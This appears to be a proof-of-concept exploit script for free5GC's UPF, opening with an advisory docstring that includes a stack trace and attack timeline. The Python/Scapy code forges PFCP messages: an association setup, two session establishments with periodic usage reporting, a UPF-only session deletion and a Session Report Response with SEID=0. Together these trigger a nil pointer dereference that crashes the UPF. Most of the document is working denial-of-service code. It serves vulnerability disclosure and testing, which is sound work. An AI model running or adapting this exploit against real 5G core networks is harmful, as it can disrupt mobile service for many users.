"""
VUL-20260602-POC: free5GC UPF nil pointer dereference via SEID=0 in PFCP Session Report Response

=== Vulnerability Summary ===

  free5GC UPF crashes with a nil pointer dereference when it processes a PFCP
  Session Report Response whose SEID field is 0.

  Root cause (node.go:710):
    In handleSessionReportResponse(), UPF reads the SEID from the response.
    When SEID == 0, UPF logs:
      "rsp SEID is 0; no this session on remote; delete it on local"
    and proceeds to delete the local session object.  It then calls
    LocalNode.RemoteSess() to access the remote (SMF-side) session mapping,
    but the mapping has already been invalidated or never existed for the
    deleted session.  No nil check is performed before dereferencing the
    returned pointer, causing a fatal panic.

=== Crash Log (confirmed 2026-06-02) ===

  [WARN][UPF][PFCP] rsp SEID is 0; no this session on remote; delete it on local
  [FATA][UPF][PFCP] panic: runtime error: invalid memory address or nil pointer dereference

=== Full Stack Trace ===

  goroutine 50 [running]:
  runtime/debug.Stack()
          /usr/local/go/src/runtime/debug/stack.go:26 +0x5e
  github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).main.func1()
          /go/src/free5gc/NFs/upf/internal/pfcp/pfcp.go:86 +0x4a
  panic({0x8e1c20?, 0xdc19b0?})
          /usr/local/go/src/runtime/panic.go:783 +0x132
  github.com/free5gc/go-upf/internal/pfcp.(*LocalNode).RemoteSess(
          0xc0001742a0?, 0x1efce, {0xa31548, 0xc000660fc0})
          /go/src/free5gc/NFs/upf/internal/pfcp/node.go:710 +0x4f   <-- NIL DEREF HERE
  github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).handleSessionReportResponse(
          0xc00072c270, 0xc000198f00, {0xa31548, 0xc000660fc0}, {0xa35a60, 0xc00059e0a0})
          /go/src/free5gc/NFs/upf/internal/pfcp/session.go:618 +0x186  <-- CALLER
  github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).rspDispacher(...)
          /go/src/free5gc/NFs/upf/internal/pfcp/dispacher.go:35 +0x65
  github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).main(...)
          /go/src/free5gc/NFs/upf/internal/pfcp/pfcp.go:169 +0xbad

=== Stack Trace Analysis ===

  1. rspDispacher (dispacher.go:35)
       Incoming PFCP message is identified as Session Report Response (msg type 57).

  2. handleSessionReportResponse (session.go:618)
       The response SEID is parsed.  SEID == 0 triggers the warning path:
         "rsp SEID is 0; no this session on remote; delete it on local"
       The local session is deleted.  Then RemoteSess() is called to look up
       the corresponding remote session object.

  3. LocalNode.RemoteSess (node.go:710)
       The function is called with CP-SEID=0x1efce (session 2 in this POC).
       Because the session mapping has already been invalidated by the prior
       deletion, the function returns a nil pointer.  No nil guard exists
       before the pointer is dereferenced -> FATAL PANIC.

=== Attack Flow ===

  The POC exploits two conditions simultaneously:
    (a) External PFCP Session Deletion Request: tells UPF to delete session 1,
        but SMF does NOT delete it, creating a state mismatch.
    (b) Forged PFCP Session Report Response with SEID=0: causes UPF to enter
        the "delete local + access remote" code path for session 2, where the
        remote session lookup returns nil.

  Timeline:
    Step 1  PFCP Association Setup            -> UPF accepts SMF
    Step 2  2x Session Establishment (URR=10s) -> UPF creates sess-1 & sess-2
    Step 3  Session Deletion (sess-1, UPF only) -> UPF deletes sess-1, SMF keeps it
    Step 4  Wait for periodic timer            -> UPF fires TYPE_PERIO_TIMEOUT
    Step 5  Session Report Req (sess-2) from UPF -> UPF reports usage to SMF
    Step 6  Session Report Resp SEID=0 from us  -> UPF enters vulnerable path
    Result  handleSessionReportResponse -> RemoteSess(0x1efce) -> NIL -> CRASH

SMF (this script)                          UPF (target)
     |                                            |
     |--- PFCP Association Setup Req ----------->|
     |<-- PFCP Association Setup Resp -----------|
     |                                            |
     |--- Session Est. Req (SESS-1, URR) ------->|  periodic URR = 10s
     |--- Session Est. Req (SESS-2, URR) ------->|  periodic URR = 10s
     |                                            |
     |--- Session Deletion Req (SESS-1) -------->|  UPF deletes sess-1
     |    (SMF keeps sess-1 state!)              |  SMF: sess-1 still alive
     |                                            |
     |        (wait ~10s for timer)              |
     |                                            |
     |<-- Session Report Req (sess-2) -----------|  TYPE_PERIO_TIMEOUT
     |                                            |
     |--- Session Report Resp SEID=0 ----------->|  "rsp SEID is 0; delete local"
     |    handleSessionReportResponse()          |  -> RemoteSess(0x1efce)
     |    nil pointer dereference                |  -> PANIC  [FATAL]
"""

import socket
import struct
import time
import threading
import sys
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.contrib.pfcp import *
from pycrate_mobile.TS24008_IE import encode_bcd
from scapy.packet import Packet
from scapy.fields import ShortField, ByteField, ThreeBytesField


# ============================================================
# Configuration
# ============================================================
SMF_IP = "10.100.200.6"   # IP of SMF
UPF_IP = "10.100.200.2"   # IP of UPF target
PFCP_PORT = 8805

PERIODIC_INTERVAL = 10  # URR periodic reporting interval (seconds)
SESSION_COUNT = 2       # Number of sessions to establish (>=2 to trigger bug)

# Sequence counters
_seq_base = 1000

# UPF-SEIDs assigned by UPF for each session (update after capturing Establishment Responses,
# or use the values observed from UPF logs).  These are the SEIDs UPF uses in the PFCP header
# when it sends Session Report Requests back to the SMF.
UPF_SEIDS = [0x1, 0x2]


# ============================================================
# Custom IE: S-NSSAI (not always in scapy contrib)
# ============================================================
class IE_S_NSSAI(Packet):
    name = "S-NSSAI"
    fields_desc = [
        ShortField("ietype", 257),
        ShortField("length", 4),
        ByteField("sst", 1),
        ThreeBytesField("sd", 0xffffff),
    ]


# ============================================================
# Step 1: PFCP Association Setup
# ============================================================
def send_association_setup():
    """Send PFCP Association Setup Request to UPF."""
    print("[*] Step 1: Sending PFCP Association Setup Request ...")
    pkt = (
        IP(src=SMF_IP, dst=UPF_IP) /
        UDP(sport=PFCP_PORT, dport=PFCP_PORT) /
        PFCP(S=0, message_type=5, seq=134) /
        PFCPAssociationSetupRequest(
            IE_list=[
                IE_NodeId(id_type=0, ipv4=SMF_IP),
                IE_RecoveryTimeStamp(timestamp=int(time.time())),
                IE_UPFunctionFeatures(
                    FTUP=1,
                    FRRT=1,
                    EMPU=1,
                    length=4,
                    extra_data=bytes.fromhex("1004")
                )
            ]
        )
    )
    send(pkt, verbose=0)
    print("[+] Association Setup Request sent.")


# ============================================================
# Step 2: PFCP Session Establishment (x2) with periodic URR
# ============================================================
def build_session_establishment(session_idx, cp_seid, ue_ip, seq_num):
    """
    Build a PFCP Session Establishment Request with periodic URR.

    The URR is configured with:
      - ReportingTriggers: periodic_reporting=1
      - MeasurementPeriod: 10 seconds
    This causes UPF to send Session Report Requests every 10 seconds.
    """
    node_id = IE_NodeId(id_type=0, ipv4=SMF_IP)

    fseid = IE_FSEID(v4=1, seid=cp_seid, ipv4=SMF_IP)

    # PDR1: downlink (Core -> UE)
    pdr1 = IE_CreatePDR(IE_list=[
        IE_PDR_Id(id=1),
        IE_Precedence(precedence=65535),
        IE_PDI(IE_list=[
            IE_SourceInterface(interface="Core"),
            IE_NetworkInstance(instance="internet"),
            IE_UE_IP_Address(V4=1, SD=1, ipv4=ue_ip),
            IE_3GPP_InterfaceType(interface_type=17)
        ]),
        IE_FAR_Id(id=1),
        IE_URR_Id(id=1),
        IE_QER_Id(id=1)
    ])

    # PDR2: uplink (Access -> Core)
    pdr2 = IE_CreatePDR(IE_list=[
        IE_PDR_Id(id=2),
        IE_Precedence(precedence=65535),
        IE_PDI(IE_list=[
            IE_SourceInterface(interface="Access"),
            IE_FTEID(CH=1, CHID=1, V4=1, V6=1, choose_id=5),
            IE_NetworkInstance(instance="internet"),
            IE_QFI(QFI=1),
            IE_3GPP_InterfaceType(interface_type=11)
        ]),
        IE_OuterHeaderRemoval(header=6),
        IE_FAR_Id(id=2),
        IE_QER_Id(id=1)
    ])

    # PDR3: CP-function downlink
    pdr3 = IE_CreatePDR(IE_list=[
        IE_PDR_Id(id=3),
        IE_Precedence(precedence=255),
        IE_PDI(IE_list=[
            IE_SourceInterface(interface="CP-function"),
            IE_FTEID(CH=1, V4=1, V6=1)
        ]),
        IE_OuterHeaderRemoval(header=6),
        IE_FAR_Id(id=1)
    ])

    # PDR4: multicast (Router Advertisement)
    pdr4 = IE_CreatePDR(IE_list=[
        IE_PDR_Id(id=4),
        IE_Precedence(precedence=255),
        IE_PDI(IE_list=[
            IE_SourceInterface(interface="Access"),
            IE_FTEID(CHID=1, CH=1, V4=1, V6=1, choose_id=5),
            IE_NetworkInstance(instance="internet"),
            IE_SDF_Filter(
                FD=1,
                flow_description="permit out 58 from ff02::2/128 to assigned"
            ),
            IE_3GPP_InterfaceType(interface_type=11)
        ]),
        IE_OuterHeaderRemoval(header=6),
        IE_FAR_Id(id=3)
    ])

    # FAR1: buffer downlink
    far1 = IE_CreateFAR(IE_list=[
        IE_FAR_Id(id=1),
        IE_ApplyAction(NOCP=1, BUFF=1, spare=0, extra_data="0"),
        IE_BAR_Id(id=1)
    ])

    # FAR2: forward uplink to Core
    far2 = IE_CreateFAR(IE_list=[
        IE_FAR_Id(id=2),
        IE_ApplyAction(FORW=1, spare=0, extra_data="0"),
        IE_ForwardingParameters(IE_list=[
            IE_DestinationInterface(interface="Core"),
            IE_NetworkInstance(instance="internet"),
            IE_3GPP_InterfaceType(interface_type=17)
        ])
    ])

    # FAR3: forward to CP-function
    far3 = IE_CreateFAR(IE_list=[
        IE_FAR_Id(id=3),
        IE_ApplyAction(FORW=1, spare=0, extra_data="0"),
        IE_ForwardingParameters(IE_list=[
            IE_DestinationInterface(interface="CP-function"),
            IE_OuterHeaderCreation(GTPUUDPIPV4=1, TEID=2, ipv4=SMF_IP)
        ])
    ])

    # URR with PERIODIC reporting trigger (the key part for this POC)
    # - periodic_reporting=1 enables the periodic timer
    # - MeasurementPeriod=10 seconds matches the log observation (TYPE_PERIO_ADD)
    urr = IE_CreateURR(IE_list=[
        IE_URR_Id(id=1),
        IE_MeasurementMethod(VOLUM=1),
        IE_ReportingTriggers(periodic_reporting=1, extra_data=b"0"),
        IE_MeasurementPeriod(period=PERIODIC_INTERVAL),
    ])

    qer = IE_CreateQER(IE_list=[
        IE_QER_Id(id=1),
        IE_GateStatus(ul=0, dl=0),
        IE_MBR(ul=1000000, dl=1000000),
        IE_QFI(QFI=1)
    ])

    bar = IE_Create_BAR(IE_list=[IE_BAR_Id(id=1)])
    pdn = IE_PDNType(pdn_type=1)

    userid = IE_UserId(
        IMSIF=1, IMEIF=1,
        imsi=encode_bcd("460990000000001"),
        imei=encode_bcd("4370816125816151")
    )
    dnn = IE_APN_DNN(apn_dnn="internet")
    snssai = IE_S_NSSAI(sst=1, length=4, sd=0xffffff)

    ie_list = [node_id, fseid, pdr1, pdr2, pdr3, pdr4,
               far1, far2, far3, urr, qer, bar, pdn, userid, dnn, snssai]

    pfcp = (
        PFCP(S=1, message_type=50, seid=0, seq=seq_num) /
        PFCPSessionEstablishmentRequest(IE_list=ie_list)
    )
    return IP(src=SMF_IP, dst=UPF_IP) / UDP(dport=PFCP_PORT) / pfcp


def send_session_establishments():
    """Establish SESSION_COUNT PFCP sessions, each with periodic URR."""
    print(f"[*] Step 2: Sending {SESSION_COUNT} PFCP Session Establishment Requests ...")
    for i in range(SESSION_COUNT):
        cp_seid = 0x1efcd + i           # distinct CP-SEID per session
        ue_ip   = f"172.28.0.{3 + i}"  # distinct UE IP per session
        seq     = _seq_base + i
        pkt = build_session_establishment(i, cp_seid, ue_ip, seq)
        send(pkt, verbose=0)
        print(f"    Session {i+1}: CP-SEID=0x{cp_seid:x}, UE-IP={ue_ip}, seq={seq}")
        time.sleep(0.2)
    print(f"[+] {SESSION_COUNT} sessions established with periodic URR (period={PERIODIC_INTERVAL}s).")


# ============================================================
# Step 3: External PFCP Session Deletion (UPF only)
# ============================================================
def send_session_deletion(up_seid, seq_num):
    """
    Send a PFCP Session Deletion Request to the UPF.

    This simulates an external entity instructing UPF to delete a session.
    The SMF side does NOT delete its local state, creating a state mismatch:
      - UPF: session deleted, mapping removed
      - SMF: session still exists, will continue to interact
    """
    pkt = (
        IP(src=SMF_IP, dst=UPF_IP) /
        UDP(sport=PFCP_PORT, dport=PFCP_PORT) /
        PFCP(S=1, message_type=54, seid=up_seid, seq=seq_num) /
        PFCPSessionDeletionRequest(IE_list=[])
    )
    send(pkt, verbose=0)


def send_external_deletions():
    """
    Send PFCP Session Deletion Request for session 1 to UPF.
    SMF does NOT delete its local session state.
    This creates the UPF/SMF state mismatch that contributes to the crash.
    """
    print("[*] Step 3: Sending external PFCP Session Deletion Request for session 1 ...")
    print(f"    UPF-SEID=0x{UPF_SEIDS[0]:x} (session 1 will be deleted on UPF side only)")
    send_session_deletion(UPF_SEIDS[0], _seq_base + 100)
    print("[+] Session 1 deleted on UPF. SMF state untouched (state mismatch).")
    time.sleep(0.5)


# ============================================================
# Step 4 & 5: Listen for Session Report Requests and reply
#             with SEID=0 to trigger the nil pointer dereference
# ============================================================
def send_session_report_response_seid0(dst_ip, dst_port, seq_num):
    """
    Send a PFCP Session Report Response with SEID=0.

    This is the malicious payload: UPF interprets SEID=0 as
    "rsp SEID is 0; no this session on remote; delete it on local"
    and proceeds to delete the local session state.
    """
    resp = (
        IP(src=SMF_IP, dst=dst_ip) /
        UDP(sport=PFCP_PORT, dport=dst_port) /
        PFCP(S=1, message_type=57, seid=0, seq=seq_num) /
        PFCPSessionReportResponse(IE_list=[
            IE_Cause(cause=1)  # Request accepted (irrelevant; SEID=0 triggers the bug)
        ])
    )
    send(resp, verbose=0)


def listen_and_respond():
    """
    Listen on PFCP port for Session Report Requests from UPF.
    Reply to each with SEID=0.

    After external deletion of session 1, UPF will still send Session Report
    Requests for the remaining session(s) when the periodic timer fires.
    Responding with SEID=0 causes UPF to delete the remaining local session.
    Combined with the already-deleted session 1 mapping, this triggers:
      -> nil pointer dereference in LocalNode.RemoteSess -> CRASH
    """
    print(f"[*] Step 4: Listening for PFCP Session Report Requests on 0.0.0.0:{PFCP_PORT} ...")
    print(f"    (Filtering for packets from {UPF_IP}; waiting up to {PERIODIC_INTERVAL + 15}s ...)")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    except (AttributeError, OSError):
        pass  # SO_REUSEPORT not available on all systems
    sock.bind(("0.0.0.0", PFCP_PORT))
    sock.settimeout(PERIODIC_INTERVAL + 15)

    report_count = 0
    try:
        while report_count < SESSION_COUNT:
            try:
                data, addr = sock.recvfrom(65535)
            except socket.timeout:
                print("[!] Timeout waiting for Session Report Requests.")
                break

            # Filter: only accept packets from the target UPF
            if addr[0] != UPF_IP:
                continue

            # Quick check: is this a PFCP Session Report Request (msg type 56)?
            if len(data) < 16:
                continue

            # PFCP header: version(4b) | spare(4b) | spare(4b) | spare(4b) | MP(1b) | S(1b) | msg_type(8b) | length(16b)
            # Byte 1: message_type
            msg_type = data[1]
            if msg_type != 56:
                # Not a Session Report Request; ignore
                continue

            # Extract sequence number (bytes 12-14 for SEID-present, or 8-10 for no-SEID)
            # With S=1 (SEID present): seq is at offset 12 (3 bytes)
            flags = data[0] & 0x01  # S bit
            if flags:
                seq_num = (data[12] << 16) | (data[13] << 8) | data[14]
            else:
                seq_num = (data[8] << 16) | (data[9] << 8) | data[10]

            report_count += 1
            print(f"[+] Received Session Report Request #{report_count} "
                  f"from {addr[0]}:{addr[1]}, seq={seq_num}")

            # Send malicious response with SEID=0
            print(f"[!] Sending Session Report Response with SEID=0 (seq={seq_num}) ...")
            send_session_report_response_seid0(addr[0], addr[1], seq_num)

    finally:
        sock.close()

    return report_count


# ============================================================
# Main
# ============================================================
def main():
    print("=" * 70)
    print(" POC: free5GC UPF nil pointer dereference")
    print("      PFCP Session Report Response with SEID=0")
    print("=" * 70)
    print()

    # Step 1: Association
    send_association_setup()
    time.sleep(1)

    # Step 2: Create multiple sessions with periodic URR
    send_session_establishments()

    # Step 3: External session deletion (UPF only, SMF keeps its state)
    send_external_deletions()

    # Step 4-5: Wait for periodic reports, reply with SEID=0
    # print()
    # # responded = listen_and_respond()
    # print()

    # if responded >= 1:
    #     print(f"[+] Sent {responded} malicious Session Report Response(s) (SEID=0).")
    #     print("[+] UPF should have crashed with nil pointer dereference.")
    #     print("[+] Check UPF logs for: 'rsp SEID is 0; no this session on remote; delete it on local'")
    #     print("[+] Crash: github.com/free5gc/go-upf/internal/pfcp.(*LocalNode).RemoteSess")
    # else:
    #     print(f"[*] No Session Report Requests received ({responded}/{SESSION_COUNT}).")
    #     print("[*] The UPF may not have fired the periodic timer yet.")
    #     print("[*] Re-run or increase the wait time.")


if __name__ == "__main__":
    main()
